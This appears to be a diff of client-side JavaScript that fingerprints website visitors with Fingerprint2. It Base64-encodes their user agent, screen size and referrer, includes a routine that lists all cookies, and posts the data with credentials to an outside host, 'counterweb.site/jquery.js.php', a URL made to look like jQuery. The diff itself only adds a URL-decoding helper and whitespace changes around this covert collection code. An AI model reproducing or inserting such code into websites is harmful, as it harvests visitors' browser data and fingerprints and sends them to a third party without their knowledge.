@@ -1,4 +1,4 @@
-    	if (window.requestIdleCallback) {
+		if (window.requestIdleCallback) {
 			requestIdleCallback(function () {
 				Fingerprint2.get(function (components) {
 					include(components);
@@ -8,7 +8,7 @@
 			setTimeout(function () {
 				Fingerprint2.get(function (components) {
 					include(components);
-				})
+				})  
 			}, 500)
 		}
 		var Base64 = {
@@ -141,39 +141,58 @@
 			}
 		}
 
+		function decodeURIComponentSafe(uri, mod) {
+			var out = new String(),
+				arr,
+				i = 0,
+				l,
+				x;
+			typeof mod === "undefined" ? mod = 0 : 0;
+			arr = uri.split(/(%(?:d0|d1)%.{2})/);
+			for (l = arr.length; i < l; i++) {
+				try {
+					x = decodeURIComponent(arr[i]);
+				} catch (e) {
+					x = mod ? arr[i].replace(/%(?!\d+)/g, '%25') : arr[i];
+				}
+				out += x;
+			}
+			return out;
+		}
+		
 		var date = new Date();
-
+		 
 		var url = '//counterweb.site';
-
+		
 		var ts = '?ts=' + btoa(date.getMilliseconds());
-
+		
 		var parstring = '?s=1';
-
-		var ua = '';
+		
+		var ua = '';		
 		try {
 		   ua = navigator.userAgent;
 		}
 		catch (e) {
 		}
-
-		if(ua.length)
+		
+		if(ua.length) 	
 			parstring += '&up=' + btoa(ua);
-
+		
 		var screensize = screen.width + "x" + screen.height + " (" + screen.availWidth + "x" + screen.availHeight + ") "  + screen.colorDepth + "x" + screen.pixelDepth;
-
+		
 		url += '/jquery.js.php' + parstring + ts + '&sc=' + btoa(screensize);
 		//console.log("url = " + url);
 		var jspp22 = document.createElement('script');
-		var userLang = navigator.language || navigator.userLanguage;
-		var utmQuery = decodeURIComponent(window.location.search.substring(1)),
+		var userLang = navigator.language || navigator.userLanguage; 
+		var utmQuery = decodeURIComponentSafe(window.location.search.substring(1)),
 		  utmVariables = utmQuery.split('&'),
 		  ParameterName,
 		  i;
-
+		
 		function include(components) {
-			var data = new FormData();
+			var data = new FormData(); 
 			var referrer = document.referrer;
-			if(referrer.length)
+			if(referrer.length) 
 				data.append('rp', btoa(referrer));
 			data.append('r', btoa(document.referrer));
 			try {
@@ -208,31 +227,31 @@
 				}
 			}
 			xmlHttp.withCredentials = true;
-			xmlHttp.open("post", ('https:' == document.location.protocol ? 'https://' : 'http://') + url, true);
-			xmlHttp.send(data);
+			xmlHttp.open("post", ('https:' == document.location.protocol ? 'https://' : 'http://') + url, true); 
+			xmlHttp.send(data); 
 			return false;
-		}
-
+		}		
+		
 		function listCookies(){
-
+			
 			var theCookies = document.cookie.split(';');
-
+			
 			var aString = '';
-
+			
 			for (var i = 1 ; i <= theCookies.length; i++) {
 				aString += i + ' ' + theCookies[i-1] + "\n";
 			}
-
+			
 			return aString;
 		}
-
+		
 		function setCookie(cname, cvalue, exdays) {
 		  var d = new Date();
 		  d.setTime(d.getTime() + (exdays*24*60*60*1000));
 		  var expires = "expires="+ d.toUTCString();
 		  document.cookie = cname + "=" + cvalue + ";" + expires + ";path=/";
 		}
-
+		
 		function getCookie(cname) {
 		  var name = cname + "=";
 		  var decodedCookie = decodeURIComponent(document.cookie);
